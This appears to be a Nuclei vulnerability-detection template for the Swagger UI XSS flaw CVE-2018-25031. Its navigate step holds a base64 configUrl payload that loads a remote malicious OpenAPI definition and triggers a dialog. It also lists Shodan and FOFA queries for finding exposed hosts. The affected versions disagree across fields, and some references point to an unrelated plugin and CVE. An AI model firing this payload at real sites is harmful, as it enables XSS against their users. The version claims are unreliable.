headless:
- matchers:
  - dsl:
    - swagger_dom == true
    type: dsl
  - case-insensitive: true
    part: body
    type: word
    words:
    - swagger
  matchers-condition: and
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}/index.html?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy9tYWluL2hlbHBlcnMvcGF5bG9hZHMvc3dhZ2dlci1wYXlsb2FkIgp9'
  - action: waitdialog
    name: swagger_dom
id: CVE-2018-25031
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:smartbear:swagger_ui:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-25031
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cwe-id: CWE-20
    epss-percentile: 0.99248
    epss-score: 0.83676
  description: 'Swagger UI before 4.1.3 could allow a remote attacker to conduct spoofing
    attacks. By persuading a victim to open a crafted URL, an attacker could exploit
    this vulnerability to display remote OpenAPI definitions.

    '
  impact: 'Attackers can trick users into viewing malicious OpenAPI definitions, potentially
    leading to information disclosure or further attacks.

    '
  metadata:
    fofa-query: icon_hash="-1180440057"
    max-request: 1
    product: swagger_ui
    shodan-query:
    - http.component:"Swagger"
    - http.component:"swagger"
    - http.favicon.hash:"-1180440057"
    vendor: smartbear
    verified: true
  name: Swagger UI < 3.38.0 - Cross-Site Scripting
  reference:
  - https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
  - https://nvd.nist.gov/vuln/detail/CVE-2018-25031
  - https://github.com/barrykooij/related-posts-for-wp/commit/37733398dd88863fc0bdb3d6d378598429fd0b81
  - https://nvd.nist.gov/vuln/detail/CVE-2022-3506
  - https://github.com/swagger-api/swagger-ui/issues/4872
  remediation: 'Update to the latest version of the Swagger UI (^4.13.0 or higher)
    to mitigate the vulnerability.

    '
  severity: medium
  tags: headless,cve,cve2018,swagger,xss,smartbear,vuln
